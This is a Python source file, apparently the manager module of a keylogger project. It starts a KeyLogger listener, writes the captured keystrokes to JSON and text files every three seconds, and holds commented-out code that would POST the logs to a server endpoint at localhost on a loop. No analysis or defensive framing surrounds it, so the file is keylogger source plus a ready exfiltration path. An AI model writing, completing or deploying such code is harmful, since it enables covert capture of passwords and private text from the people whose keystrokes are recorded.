import time
import requests
import threading
from listener import KeyLogger
from write_to_file import WriteToFile

class Manager:
    def __init__(self):
        self.recorde = KeyLogger()
        self.data = WriteToFile()
        self.running = True
        self.url = "http://127.0.0.1:5000/receiveData"


    def start_recording(self):
        self.running = True
        self.recorde.start_listen()
        threading.Thread(target=self.write_periodically, daemon=True).start()
        # threading.Thread(target=self.send_data_periodically, daemon=True).start()


    def stop_recording(self):
        self.recorde.stop_listen()
        self.running = False


    def write_json_and_txt_file(self):
        self.data.data = self.recorde.get_logs()
        if self.data.data != "":
            self.data.write_to_json_file()
            self.data.write_to_file()


    def write_periodically(self):
        while self.running:
            time.sleep(3)
            self.write_json_and_txt_file()


    # def send_data_to_server(self):
    #     try:
    #         response = requests.post(self.url, json=self.data.enter_to_dic())
    #         if response.status_code == 200:
    #             print("Data sent to server successfully!")
    #         else:
    #             print(f"Error sending data to server. Status code: {response.status_code}")
    #             print(response.text)
    #     except Exception as e:
    #         print(f"Error sending data: {e}")
    #
    #
    # def send_data_periodically(self):
    #     while self.running:
    #         time.sleep(3)
    #         self.send_data_to_server()



# if __name__ == '__main__':
#     n = Manager()
#     n.start_recording()
#     print("חחחח")
#
#     try:
#         while True:
#             time.sleep(0.1)
#     except KeyboardInterrupt:
#         n.stop_recording()










